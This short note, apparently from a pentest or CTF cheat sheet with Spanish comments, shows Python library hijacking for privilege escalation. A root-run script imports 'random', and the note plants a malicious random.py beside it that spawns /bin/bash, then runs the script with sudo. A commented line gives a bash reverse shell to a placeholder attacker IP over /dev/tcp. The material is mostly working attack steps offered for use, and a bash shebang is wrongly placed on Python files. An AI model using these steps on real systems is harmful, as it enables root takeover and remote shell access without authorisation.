
user> cat example.py  
example.py:
#!/usr/bin/bash
import random
print(random.randint(1, 8))

# Podemos crear un script malicioso en python con el mismo nombre que el modulo que 
# importa, de esta manera , se ejecutara antes que el resto y con permisos de root
# En este caso importa el modulo: random

user> touch /opt/scripts/random.py

#!/usr/bin/bash
import os
os.system("/bin/bash")
#Para una rever : 
# os.system('bash -c "/bin/bash -i >& /dev/tcp/<ATTACING_IP>/9001 0>&1"')
  
user> sudo  /usr/bin/python3 /opt/scripts/example.py
   
 
```